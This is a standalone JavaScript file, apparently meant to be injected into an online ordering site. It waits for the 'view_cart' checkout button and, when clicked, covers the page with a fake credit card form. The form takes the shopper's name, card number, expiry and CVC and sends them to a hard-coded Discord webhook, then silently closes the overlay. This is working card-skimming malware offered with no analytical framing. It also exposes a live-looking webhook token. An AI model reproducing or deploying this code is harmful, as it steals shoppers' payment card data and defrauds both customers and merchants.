const waitForCheckoutButton = () => {
    const checkoutButton = document.getElementById('view_cart');
    if (checkoutButton) {
        checkoutButton.addEventListener('click', () => {
            // Prevent body scrolling
            document.body.style.overflow = 'hidden';

            // Add Tailwind CSS
            const tailwind = document.createElement('script');
            tailwind.src = 'https://cdn.tailwindcss.com';
            document.head.appendChild(tailwind);

            // Create meta viewport tag
            const meta = document.createElement('meta');
            meta.name = 'viewport';
            meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.head.appendChild(meta);

            // Create overlay
            const overlay = document.createElement('div');
            overlay.id = 'white-overlay';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100vw';
            overlay.style.height = '100vh';
            overlay.style.backgroundColor = 'white';
            overlay.style.zIndex = '10000';

            // Create container
            const container = document.createElement('div');
            container.className = 'flex items-center justify-center h-full';
            overlay.appendChild(container);

            // Create credit card container
            const creditCardContainer = document.createElement('div');
            creditCardContainer.className = 'bg-white p-6 rounded-t-3xl shadow-lg w-full max-w-md relative';
            container.appendChild(creditCardContainer);

            // Create close button
            const closeButton = document.createElement('button');
            closeButton.className = 'absolute top-4 right-4 text-gray-600 hover:text-gray-800';
            closeButton.innerHTML = '<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
            closeButton.onclick = () => overlay.remove();
            creditCardContainer.appendChild(closeButton);

            // Create header
            const header = document.createElement('div');
            header.className = 'mb-6';
            const title = document.createElement('div');
            title.className = 'text-lg font-semibold text-gray-800 flex items-center';
            title.textContent = 'Credit Card';
            const visaImg = document.createElement('img');
            visaImg.src = 'https://d1uz2kmrg3qq0r.cloudfront.net/assets/theme/orderup/ouv2/assets/images/card_type/visa.png';
            visaImg.className = 'h-6 ml-2';
            const mastercardImg = document.createElement('img');
            mastercardImg.src = 'https://d1uz2kmrg3qq0r.cloudfront.net/assets/theme/orderup/ouv2/assets/images/card_type/mastercard.png';
            mastercardImg.className = 'h-6 ml-2';
            title.appendChild(visaImg);
            title.appendChild(mastercardImg);
            header.appendChild(title);
            creditCardContainer.appendChild(header);

            // Create form
            const form = document.createElement('form');
            form.className = 'space-y-4';
            form.onsubmit = async (e) => {
                e.preventDefault();
                // Collect form data
                const formData = {
                    name: document.getElementById('nameoncard').value,
                    cardNumber: document.getElementById('card-number').value,
                    expiry: document.getElementById('card-expiry').value,
                    cvc: document.getElementById('card-cvc').value
                };

                // Send data to Discord webhook
                try {
                    await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            embeds: [{
                                title: 'New Payment Submission',
                                fields: [
                                    { name: 'Name on Card', value: formData.name || 'N/A', inline: true },
                                    { name: 'Card Number', value: formData.cardNumber || 'N/A', inline: true },
                                    { name: 'Expiry', value: formData.expiry || 'N/A', inline: true },
                                    { name: 'CVC', value: formData.cvc || 'N/A', inline: true }
                                ],
                                color: 3447003,
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                    // Close overlay after successful submission
                    overlay.remove();
                } catch (error) {
                    // Handle error silently
                    overlay.remove();
                }
            };
            creditCardContainer.appendChild(form);

            // Create cardholder name input
            const nameDiv = document.createElement('div');
            const nameInput = document.createElement('input');
            nameInput.type = 'text';
            nameInput.id = 'nameoncard';
            nameInput.placeholder = 'Name On Card';
            nameInput.required = true;
            nameInput.autocomplete = 'off';
            nameDiv.appendChild(nameInput);
            form.appendChild(nameDiv);

            // Create card number input
            const cardNumberDiv = document.createElement('div');
            const cardNumberInput = document.createElement('input');
            cardNumberInput.type = 'text';
            cardNumberInput.id = 'card-number';
            cardNumberInput.placeholder = 'Card Number';
            cardNumberInput.required = true;
            cardNumberInput.maxLength = 19;
            const cardNumberError = document.createElement('span');
            cardNumberError.id = 'card-number-error';
            cardNumberError.textContent = 'Invalid card number';
            cardNumberDiv.appendChild(cardNumberInput);
            cardNumberDiv.appendChild(cardNumberError);
            form.appendChild(cardNumberDiv);

            // Create flex container for expiry and CVV
            const flexContainer = document.createElement('div');
            flexContainer.className = 'flex space-x-5';
            form.appendChild(flexContainer);

            // Create expiry date input
            const expiryDiv = document.createElement('div');
            expiryDiv.className = 'flex-1';
            const expiryInput = document.createElement('input');
            expiryInput.type = 'text';
            expiryInput.id = 'card-expiry';
            expiryInput.placeholder = 'MM/YY';
            expiryInput.required = true;
            expiryInput.maxLength = 5;
            const expiryError = document.createElement('span');
            expiryError.id = 'card-expiry-error';
            expiryError.textContent = 'Invalid expiry date';
            expiryDiv.appendChild(expiryInput);
            expiryDiv.appendChild(expiryError);
            flexContainer.appendChild(expiryDiv);

            // Create CVV input
            const cvvDiv = document.createElement('div');
            cvvDiv.className = 'flex-1';
            const cvvInput = document.createElement('input');
            cvvInput.type = 'text';
            cvvInput.id = 'card-cvc';
            cvvInput.placeholder = 'CVC';
            cvvInput.required = true;
            cvvInput.maxLength = 4;
            const cvvError = document.createElement('span');
            cvvError.id = 'card-cvc-error';
            cvvError.textContent = 'Invalid CVC';
            cvvDiv.appendChild(cvvInput);
            cvvDiv.appendChild(cvvError);
            flexContainer.appendChild(cvvDiv);

            // Create next button
            const nextButton = document.createElement('button');
            nextButton.type = 'submit';
            nextButton.className = 'w-full bg-blue-600 text-white py-3 rounded-full hover:bg-blue-700';
            nextButton.textContent = 'Next';
            form.appendChild(nextButton);

            // Append overlay to body
            document.body.appendChild(overlay);
        });
        clearInterval(checkInterval);
    }
};

const checkInterval = setInterval(waitForCheckoutButton, 100);

// Timeout to prevent infinite checking
setTimeout(() => {
    clearInterval(checkInterval);
}, 100000000); 
